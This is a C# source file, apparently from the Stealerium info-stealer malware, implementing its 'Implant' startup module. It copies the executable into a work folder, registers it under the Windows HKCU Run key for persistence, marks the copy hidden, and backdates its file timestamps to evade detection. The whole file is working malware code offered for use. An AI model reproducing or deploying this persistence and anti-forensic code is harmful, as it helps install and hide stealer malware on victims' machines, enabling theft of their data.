using System;
using System.IO;
using Microsoft.Win32;
using Stealerium.Helpers;

namespace Stealerium.Modules.Implant
{
    internal sealed class Startup
    {
        // Install
        public static readonly string ExecutablePath = AppDomain.CurrentDomain.BaseDirectory;
        private static readonly string InstallDirectory = Paths.InitWorkDir();

        private static readonly string InstallFile = Path.Combine(
            InstallDirectory, new FileInfo(ExecutablePath).Name);

        // Autorun
        private static readonly string StartupKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        private static readonly string StartupName = Path.GetFileNameWithoutExtension(ExecutablePath);

        // Change file creation date
        public static void SetFileCreationDate(string path = null)
        {
            var filename = path;
            if (path == null) filename = ExecutablePath;
            // Log
            Logging.Log("SetFileCreationDate : Changing file " + filename + " creation data");

            var time = new DateTime(
                DateTime.Now.Year - 2, 5, 22, 3, 16, 28);

            File.SetCreationTime(filename, time);
            File.SetLastWriteTime(filename, time);
            File.SetLastAccessTime(filename, time);
        }

        // Hide executable
        public static void HideFile(string path = null)
        {
            var filename = path;
            if (path == null) filename = ExecutablePath;
            // Log
            Logging.Log("HideFile : Adding 'hidden' attribute to file " + filename);
            new FileInfo(filename).Attributes |= FileAttributes.Hidden;
        }

        // Check if app installed to autorun
        public static bool IsInstalled()
        {
            var rkApp = Registry.CurrentUser.OpenSubKey(StartupKey, false);
            return rkApp?.GetValue(StartupName) != null && File.Exists(InstallFile);
        }

        // Install module to startup
        public static void Install()
        {
            Logging.Log("Startup : Adding to autorun...");
            // Copy executable
            if (!File.Exists(InstallFile))
                File.Copy(ExecutablePath, InstallFile);
            // Add to startup
            var rkApp = Registry.CurrentUser.OpenSubKey(StartupKey, true);
            if (rkApp != null && rkApp.GetValue(StartupName) == null)
                rkApp.SetValue(StartupName, InstallFile);
            // Hide files & change creation date
            foreach (var file in new[] {InstallFile})
                if (File.Exists(file))
                {
                    HideFile(file);
                    SetFileCreationDate(file);
                }
        }

        // Executable is running from startup directory
        public static bool IsFromStartup()
        {
            return ExecutablePath.StartsWith(InstallDirectory);
        }
    }
}